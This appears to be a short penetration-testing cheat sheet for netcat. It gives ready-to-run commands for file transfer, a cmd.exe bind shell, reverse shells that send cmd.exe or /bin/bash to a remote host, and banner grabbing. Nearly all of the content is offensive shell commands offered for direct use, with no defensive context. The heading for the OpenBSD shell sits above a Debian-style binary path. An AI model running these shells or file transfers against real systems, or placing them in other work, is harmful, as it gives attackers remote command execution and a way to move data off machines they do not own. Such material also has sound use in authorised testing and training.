## Establish the variable

```bash
export ip=192.168.1.100
```

### Send files with `nc`

```bash
nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe
```

### Recieve file with `nc`

```bash
nc -nlvp 4444 > incoming.exe
```

### Create a reverse shell with Ncat using cmd.exe on Windows

```cmd
nc.exe -nlvp 4444 -e cmd.exe
```

***or***

```cmd
nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe
```

### Create a reverse shell with Ncat using bash on Linux

```bash
nc -nv $ip 4444 -e /bin/bash
```

### Create a reverse shell with Ncat using shell on OpenBSD (Unix)

```sh
/bin/nc.traditional -e /bin/bash 1.2.3.4 4444
```

### Netcat for Banner Grabbing:

```bash
echo "" | nc -nv -w1 $ip 4444
```
